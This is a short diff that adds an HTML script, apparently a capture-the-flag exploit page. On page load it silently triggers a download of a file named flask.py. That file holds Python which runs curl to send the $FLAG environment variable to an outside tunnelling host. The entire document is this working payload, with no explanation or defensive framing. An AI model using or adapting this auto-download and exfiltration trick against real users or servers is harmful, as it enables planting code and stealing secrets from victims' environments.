@@ -1,0 +1,13 @@
+
+<script>
+
+	window.onload = () => {
+	    let a = document.createElement('a');
+		payload = `import os; os.system('curl "https://0a443bdeba261c.lhr.life?flag=$FLAG"')`
+	    a.href = URL.createObjectURL(new Blob([payload], {type: 'text/plain'}));
+	    a.download = 'flask.py'
+
+	    document.body.appendChild(a);
+	    a.click();
+	}
+</script>
